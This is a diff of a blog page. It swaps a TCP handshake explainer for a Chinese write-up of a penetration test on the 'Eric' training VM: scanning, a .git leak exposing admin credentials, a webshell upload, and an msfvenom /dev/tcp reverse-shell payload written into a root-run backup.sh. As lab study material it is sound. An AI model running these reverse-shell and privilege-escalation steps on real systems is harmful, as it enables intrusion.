@@ -4,11 +4,13 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="TCP的三次握手, NEUQ  CTF 子实  ZiShi 计算机科学与技术 网络安全">
+    <meta name="keywords" content="Eric靶机渗透测试总结, NEUQ  CTF 子实  ZiShi 计算机科学与技术 网络安全">
     <meta name="baidu-site-verification" content>
     <meta name="google-site-verification" content>
-    <meta name="description" content="TCP三次握手TCP/IP协议简介TCP/IP协议是一个协议族，里面包括了IP协议，IMCP协议，TCP协议，以及我们更加熟悉的http、ftp、pop3协议等等，这些协议类似于国际语言，大家在交流时同一使用的语言。  
-TCP/IP协议的">
+    <meta name="description" content="环境配置直接将下载好的eric靶机文件使用vbox虚拟机导入，
+问题：
+由于我的 kail 是装在vmare中的，所以如果选择nat 模式的网络连接是没办法访问到vbox中的虚拟机的，因为两个不同的虚拟机软件使用的是两个nat网络。 
+解决">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -16,7 +18,7 @@ TCP/IP协议的">
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>TCP的三次握手 | ZS BLOG</title>
+    <title>Eric靶机渗透测试总结 | ZS BLOG</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -315,7 +317,7 @@ TCP/IP协议的">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        TCP的三次握手
+                        Eric靶机渗透测试总结
                     </div>
                 </div>
             </div>
@@ -426,8 +428,12 @@ TCP/IP协议的">
                     
                     <div class="article-tag">
                         
-                        <a href="/tags/计算机网络/" target="_blank">
-                            <span class="chip bg-color">计算机网络</span>
+                        <a href="/tags/web/" target="_blank">
+                            <span class="chip bg-color">web</span>
+                        </a>
+                        
+                        <a href="/tags/渗透测试/" target="_blank">
+                            <span class="chip bg-color">渗透测试</span>
                         </a>
                         
                     </div>
@@ -438,8 +444,8 @@ TCP/IP协议的">
                     <div class="post-cate">
                         <i class="fa fa-bookmark fa-fw icon-category"></i>
                         
-                        <a href="/categories/计科/" class="post-category" target="_blank">
-                            计科
+                        <a href="/categories/网络安全/" class="post-category" target="_blank">
+                            网络安全
                         </a>
                         
                     </div>
@@ -450,7 +456,7 @@ TCP/IP协议的">
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-06-29
+                    2019-12-07
                 </div>
 
                 <div class="post-author info-break-policy">
@@ -464,14 +470,14 @@ TCP/IP协议的">
                 
                 <div class="info-break-policy">
                     <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    810
+                    1.2k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    5 分
                 </div>
                 
                 
@@ -487,68 +493,122 @@ TCP/IP协议的">
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="TCP三次握手"><a href="#TCP三次握手" class="headerlink" title="TCP三次握手"></a>TCP三次握手</h1><h2 id="TCP-IP协议"><a href="#TCP-IP协议" class="headerlink" title="TCP/IP协议"></a>TCP/IP协议</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>TCP/IP协议是一个协议族，里面包括了IP协议，IMCP协议，TCP协议，以及我们更加熟悉的http、ftp、pop3协议等等，这些协议类似于国际语言，大家在交流时同一使用的语言。  </p>
-<h3 id="TCP-IP协议的分层"><a href="#TCP-IP协议的分层" class="headerlink" title="TCP/IP协议的分层"></a>TCP/IP协议的分层</h3><h4 id="OSI参考模型自上而下分别是"><a href="#OSI参考模型自上而下分别是" class="headerlink" title="OSI参考模型自上而下分别是"></a>OSI参考模型自上而下分别是</h4><table>
-<thead>
-<tr>
-<th align="center">OSI参考模型</th>
-<th align="center">TCP/IP五层模型</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">应用层，表示层，会话层，传输层</td>
-<td align="center">应用层</td>
-</tr>
-<tr>
-<td align="center">传输层</td>
-<td align="center">传输层</td>
-</tr>
-<tr>
-<td align="center">网络层</td>
-<td align="center">网络层</td>
-</tr>
-<tr>
-<td align="center">数据链路层</td>
-<td align="center">数据链路层</td>
-</tr>
-<tr>
-<td align="center">物理层</td>
-<td align="center">物理层</td>
-</tr>
-</tbody></table>
-<h4 id="各层的作用"><a href="#各层的作用" class="headerlink" title="各层的作用"></a>各层的作用</h4><ul>
-<li>应用层  <ul>
-<li>向用户提供常用的应用程序，比如电子邮件（pop3），文件传输（FTP），远程登录（TELNET）等。  </li>
-</ul>
+                <h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>直接将下载好的eric靶机文件使用vbox虚拟机导入，</p>
+<p>问题：</p>
+<p>由于我的 <u>kail</u> 是装在<u>vmare</u>中的，所以如果选择<u>nat</u> 模式的网络连接是没办法访问到<u>vbox</u>中的虚拟机的，因为两个不同的虚拟机软件使用的是两个<u>nat</u>网络。 </p>
+<p>解决方法：</p>
+<p>将两个虚拟机的网络连接模式都选择桥接模式，桥接到同一网卡即可，注意此时电脑的网络不能使用联通校园网，否则无法进行网卡桥接，手机开个热点就行了。</p>
+<h1 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h1><h2 id="netdiscover-用法"><a href="#netdiscover-用法" class="headerlink" title="netdiscover  用法"></a>netdiscover  用法</h2><pre><code>-i device: your network device
+-r range: scan a given range instead of auto scan. 192.168.6.0/24,/16,/8
+-l file: scan the list of ranges contained into the given file
+-p passive mode: do not send anything, only sniff
+-m file: scan a list of known MACs and host names
+-F filter: customize pcap filter expression (default: &quot;arp&quot;)
+-s time: time to sleep between each ARP request (milliseconds)
+-c count: number of times to send each ARP request (for nets with packet loss)
+-n node: last source IP octet used for scanning (from 2 to 253)
+-d ignore home config files for autoscan and fast mode
+-f enable fastmode scan, saves a lot of time, recommended for auto
+-P print results in a format suitable for parsing by another program and stop after active scan
+-L similar to -P but continue listening after the active scan is completed
+-N Do not print header. Only valid when -P or -L is enabled.
+-S enable sleep time suppression between each request (hardcore mode)</code></pre><p><strong>举例：</strong></p>
+<pre><code>root@kail:~# netdiscover -i eth0 -r 192.168.43.0/24</code></pre><p>-i是指定网卡  -r是指定ip地址的范围</p>
+<h2 id="dirbuster-目录爆破"><a href="#dirbuster-目录爆破" class="headerlink" title="dirbuster 目录爆破"></a>dirbuster 目录爆破</h2><p>开启命令</p>
+<pre><code>root@kail:~# dirbuster </code></pre><p>kail 自带的爆破列表所在位置：</p>
+<pre><code>/usr/share/wordlists/</code></pre><h2 id="nmap-初步"><a href="#nmap-初步" class="headerlink" title="nmap 初步"></a>nmap 初步</h2><ul>
+<li><p>扫描主机开放端口</p>
+<p>nmap 192.168.1.1</p>
 </li>
-<li>传输层  <ul>
-<li>提供应用程序间的通信。功能包括：1、格式化信息流；2、提供可靠传输服务。为实现后者，传输层协议规定接收端必须返回确认信息，如果分组丢失，必须重新发送。  </li>
-</ul>
+<li><p>查看是否开放某一端口</p>
+<p>nmap -p 8080 192.168.1.1</p>
+<p>同时查询多个端口</p>
+<p>nmap  -p 22,21,80 192.168.31.13</p>
+<p>查询多个网段</p>
+<p>nmap  -p 22,21,80 192.168.31.1-253</p>
+<p>扫描整个子网</p>
+<p>nmap 192.168.31.1/24 </p>
 </li>
-<li>网络层  <ul>
-<li>负责相邻计算机之间的通信。功能包括三方面  <ol>
-<li>处理来自传输层的分组发送请求，收到请求后，将分组装入IP数据报，填充报头，选择去往信宿机的路径，然后将数据报发往适当的网络接口。  </li>
-<li>处理输入数据报：首先检查合法性，然后进行寻径–假如该数据报已到达信宿机则去掉报头，将剩下的部分交给适当的传输协议；假如该数据报未到达信宿，则转发数据报。  </li>
-<li>处理路径、流控、拥塞等问题。  </li>
-</ol>
+<li><p>强力模式</p>
+<p>nmap -A 192.168.0.1</p>
 </li>
 </ul>
+<h2 id="msfvenom-生成脚本"><a href="#msfvenom-生成脚本" class="headerlink" title="msfvenom 生成脚本"></a>msfvenom 生成脚本</h2><p><a href="https://www.cnblogs.com/ScriptKid-Lu/p/10559563.html" target="_blank" rel="noopener">博主总结</a></p>
+<h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><pre><code>root@kail:~# netdiscover -i eth0 -r 192.168.43.0/24
+
+ Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                
+ 32 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 1920                                     
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 192.168.43.76   08:00:27:fe:19:1e      2     120  PCS Systemtechnik GmbH                              
+ 192.168.43.95   e4:a7:c5:c5:f6:ef     28    1680  HUAWEI TECHNOLOGIES CO.,LTD                         
+ 192.168.43.146  b8:08:cf:96:f6:0e      2     120  Intel Corporate                                     
+[14]+  已停止               netdiscover -i eth0 -r 192.168.43.0/24</code></pre><p>192.168.43.76 即为 eric 靶机的ip</p>
+<h3 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h3><ul>
+<li><p>nmap 扫描主机开放的所有端口</p>
+<p><img src="https://pic1.superbed.cn/item/5de91065f1f6f81c50d848e7.jpg" alt></p>
+<p>发现开放了80端口，尝试访问</p>
+<p><img src="https://pic3.superbed.cn/item/5de910bcf1f6f81c50d8598f.jpg" alt></p>
+<p>发现是一个还未建设完毕的博客。</p>
 </li>
-<li>数据链路层  <ul>
-<li>一般用来处理连接硬件的部分，包括控制网卡，硬件相关的设备驱动等。传输单位数据帧。  </li>
+<li><p>使用<strong>dirbuster</strong>进行目录爆破。</p>
+<pre><code>root@kail:~# dirbuster </code></pre><p><img src="C:%5CUsers%5CMAIBENBEN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1575557516150.png" alt="1575557516150"></p>
+<p><img src="https://pic3.superbed.cn/item/5de9193bf1f6f81c50d9fe64.jpg" alt></p>
+<p>发现了 admin.php, 尝试访问。</p>
+<p><img src="https://pic1.superbed.cn/item/5de91ac0f1f6f81c50da4010.jpg" alt></p>
+<p>得到一个登录页面，随意输入用户名和密码，结果，返回提示我们不要尝试进行弱口令爆破了。</p>
+<p>Wrong username and/or password. Don’t even bother bruteforcing.</p>
+</li>
+<li><p>使用nmap 强力模式进行扫描，得到扫描结果</p>
+<p><img src="https://pic1.superbed.cn/item/5dea180ef1f6f81c50041041.jpg" alt></p>
+<p>发现存在 .git  泄露漏洞。</p>
+</li>
 </ul>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>使用 GitHack 工具可以利用 .git 漏洞对网站的工程文件重建。</p>
+<p><img src="https://pic.superbed.cn/item/5dea430df1f6f81c500d710c.jpg" alt></p>
+<p>查看获取到的文件，在admin.php 里面发现账户密码</p>
+<p><img src="https://pic3.superbed.cn/item/5dea45b2f1f6f81c500dfdf2.jpg" alt></p>
+<p>这密码怎么可能爆破出来,emmmmm-</p>
+<p>使用找的的密码进行登录，得到</p>
+<p><img src="https://pic.superbed.cn/item/5dea4a0bf1f6f81c500ec799.jpg" alt></p>
+<p>上传后门文件。</p>
+<p><img src="https://pic.superbed.cn/item/5dea56def1f6f81c50121c89.jpg" alt></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><ul>
+<li><p>反向shell</p>
+<p>在kail 上创建nc 监听。</p>
+<p>​    root@kail:~# nc -lnvp 1234</p>
+<p>访问我们上传的大马，找到network 中的 Reverse Shell 填入我们kail 的 ip, , run  一下</p>
+<p><a href="http://192.168.43.76/upload/nosafe.php#!network" target="_blank" rel="noopener">http://192.168.43.76/upload/nosafe.php#!network</a></p>
+<p>连接成功</p>
+<p><img src="https://pic.superbed.cn/item/5dea604bf1f6f81c50143d28.jpg" alt></p>
+</li>
+<li><p>提权</p>
+<p>尝试 </p>
+<pre><code>/var/www&gt;cd ~
+/bin/sh: 3: cd: can&#39;t cd to ~</code></pre><p>我们没有root权限，不能查看根目录。</p>
+<p>尝试提权</p>
+<p><img src="https://pic2.superbed.cn/item/5dea62baf1f6f81c5014b79f.jpg" alt></p>
+<p>找到了home 文件夹，发现了一个flag.txt, 可是此时要求的是root/flag.txt 这个文件显然路径不对。</p>
+<p>我们发现了backup.sh, 该文件我们呢有完全的读写权限，而且该文件还拥有root权限，所以可以尝试更改此文件，从而获取到root权限。</p>
+<p>查看该文件，发现是一个将网站文件进行打包压缩的命令</p>
+<p>生成反向shell脚本</p>
+<pre><code>root@kail:~# msfvenom -p cmd/unix/reverse_bash lhost=192.168.43.147 lport=4455 R
+[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
+[-] No arch selected, selecting arch: cmd from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 68 bytes
+0&lt;&amp;154-;exec 154&lt;&gt;/dev/tcp/192.168.43.147/4455;sh &lt;&amp;154 &gt;&amp;154 2&gt;&amp;154</code></pre><p>写入 backup.sh</p>
+<pre><code>/home/eric&gt;echo &quot;0&lt;&amp;154-;exec 154&lt;&gt;/dev/tcp/192.168.43.147/4455;sh &lt;&amp;154 &gt;&amp;154 2&gt;&amp;154&quot;&gt; backup.sh</code></pre><p>创建另一个监听端口，运行backup.shell</p>
+<p><img src="https://pic1.superbed.cn/item/5dea7d78f1f6f81c5019b7ed.jpg" alt></p>
+<p>得到最终的flag。</p>
 </li>
 </ul>
-<h2 id="TCP三次握手-1"><a href="#TCP三次握手-1" class="headerlink" title="TCP三次握手"></a>TCP三次握手</h2><ol>
-<li>Client 将标志SYN置为1， 随机产生一个seq=J， 并将该数据包发送各Server，Client进入SYN_SENT状态，等待Server确认  </li>
-<li>Server接收到client的SYN后，把这个连接信息放到半连接队列中，由标志位syn=1知道client请求建立连接，Server将标志位SYN和ACK都置为1，ack=J+1，随机产生一个seq=k， 并将该数据包发送给client已确认连接请求, server 进入SYN_RCVD状态。  <blockquote>
-<p>syn floor 攻击就是针对半连接队列，攻击方不停的连接，但是连接只做第一步，第二步中攻击方收到server的syn+ack后故意扔掉什么也不做， 导致server上这个队列满，其他正常请求无法进来。  </p>
-</blockquote>
-</li>
-<li>client收到确认后，检查ack是否位J+1， ACK是否为1， 如果正确则标志位ACK置为1， ack=K+1， 并将该数据包发送给server， server检查ack是否为K+1， ACK是否为1，如果正确则建立连接成功，将连接信息从半连接队列中拿出放入全连接队列中。 client和server进入ESTABLISHED状态，完成三次握手，随后client和server之间便可以开始传数据了。  <blockquote>
-<p>如果此时全连接队列已满并且tcp_abort_on_overflow是0的话,server过一段时间会再次发送syn+ack给client(也就是重走第二步), 如果client的超时等待不叫段的, client就很容易异常了。  </p>
-</blockquote>
-</li>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
+<li>主机发现</li>
+<li>漏洞发现</li>
+<li>漏洞利用</li>
+<li>提权</li>
 </ol>
 
             </div>
@@ -708,9 +768,9 @@ TCP/IP协议的">
             <br/>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
                   property="dct:title" rel="dct:type">
-                    《TCP的三次握手》
+                    《Eric靶机渗透测试总结》
                 </span> 由
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/06/29/2019-tcp-san-ci-wo-shou/" property="cc:attributionName"
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/12/07/2019-eric-shen-tou-ce-shi-zong-jie/" property="cc:attributionName"
                rel="cc:attributionURL">
                 ZS
             </a> 采用
@@ -751,7 +811,7 @@ TCP/IP协议的">
         repo: 'newlzs.github.io',
         owner: 'newlzs',
         admin: "newlzs",
-        id: '2019/06/29/2019-tcp-san-ci-wo-shou/',
+        id: '2019/12/07/2019-eric-shen-tou-ce-shi-zong-jie/',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -772,50 +832,52 @@ TCP/IP协议的">
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2019/07/22/2019-numpy/">
+                <a href="/2019/12/07/2019-eric-shen-tou-ce-shi-zong-jie/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="Numpy">
+                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="Eric靶机渗透测试总结">
                         
-                        <span class="card-title">Numpy</span>
+                        <span class="card-title">Eric靶机渗透测试总结</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            为了以后数学建模比赛做的准备，numpy对与矩阵的处理特别的方便。
+                            小白的第一次渗透测试，总结一下，问题还有很多，还有继续努力呀。
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-07-22
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-12-07
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/python/" class="post-category" target="_blank">
-                                    python
+                            <a href="/categories/网络安全/" class="post-category" target="_blank">
+                                    网络安全
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/python/" target="_blank">
-                        <span class="chip bg-color">python</span>
+                    <a href="/tags/web/" target="_blank">
+                        <span class="chip bg-color">web</span>
                     </a>
                     
-                    <a href="/tags/数据分析/" target="_blank">
-                        <span class="chip bg-color">数据分析</span>
+                    <a href="/tags/渗透测试/" target="_blank">
+                        <span class="chip bg-color">渗透测试</span>
                     </a>
                     
                 </div>
@@ -829,33 +891,33 @@ TCP/IP协议的">
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/06/02/2019-ubuntu-vscode-c-huan-jing/">
+                <a href="/2019/11/25/2019-wen-jian-shang-chuan-lou-dong/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="vs的c++环境配置">
+                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="文件上传漏洞总结">
                         
-                        <span class="card-title">vs的c++环境配置</span>
+                        <span class="card-title">文件上传漏洞总结</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            在ubuntu中 配置vscode 的 C++ 环境安装C++环境
-sudo apt install gcc  
-sudo apt install g++  
-
-配置vscode
-点击左侧齿轮按纽，点击弹出窗口的齿轮按钮添加环境  
-
-然后
+                            好久没写了，最近有些懈怠。。。。，坚持啊
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-06-02
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-11-25
                             </span>
                         <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/网络安全/" class="post-category" target="_blank">
+                                    网络安全
+                                </a>
+                            
                             
                         </span>
                     </div>
@@ -863,8 +925,12 @@ sudo apt install g++
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/环境配置/" target="_blank">
-                        <span class="chip bg-color">环境配置</span>
+                    <a href="/tags/web/" target="_blank">
+                        <span class="chip bg-color">web</span>
+                    </a>
+                    
+                    <a href="/tags/CTF/" target="_blank">
+                        <span class="chip bg-color">CTF</span>
                     </a>
                     
                 </div>
